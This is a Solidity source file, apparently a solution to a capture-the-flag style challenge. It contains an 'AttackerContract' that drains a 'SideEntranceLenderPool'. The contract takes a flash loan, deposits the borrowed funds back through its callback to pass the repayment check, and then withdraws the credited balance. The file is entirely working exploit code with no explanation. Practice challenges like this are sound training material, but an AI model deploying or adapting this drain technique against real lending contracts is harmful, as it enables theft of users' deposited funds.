// SPDX-License-Identifier: Unidentified

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external;
}

contract AttackerContract {
    function execute() external payable {
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function exploit(address _contract, uint256 amount) external {
        ISideEntranceLenderPool(_contract).flashLoan(amount);
        ISideEntranceLenderPool(_contract).withdraw();
    }

    fallback() external payable {}
}
